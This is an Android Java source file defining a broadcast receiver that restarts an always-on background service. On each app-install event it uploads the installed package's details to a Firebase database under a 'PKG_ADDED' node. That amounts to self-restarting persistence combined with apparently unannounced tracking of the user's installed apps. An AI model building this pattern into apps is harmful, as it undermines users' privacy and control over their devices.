package com.wasitech.permissioncenter.java.com.wasitech.NeverEnding;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

import com.google.firebase.database.DatabaseReference;
import com.wasitech.basics.classes.Basics;
import com.wasitech.assist.command.family.QA;

import com.wasitech.database.CloudDB;
import com.wasitech.basics.classes.Issue;

public class RestartReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        try {
            context.startService(new Intent(context, AlwaysOnJob.class));
        } catch (Exception e) {
            Issue.print(e, RestartReceiver.class.getName());
        }
        try {
            if (intent != null && intent.getAction() != null) {
                if (intent.getAction().equals(Intent.ACTION_PACKAGE_ADDED)) {
                    DatabaseReference ref = CloudDB.Tinggo.tingGo();
                    ref.child("PKG_ADDED").child(QA.tingTime()).setValue(intent.toString());
                    Basics.Log(intent.getAction());
                    Basics.Log(intent.toString());
                }
            }
        } catch (Exception e) {
            Issue.print(e, RestartReceiver.class.getName());
        }
    }
}
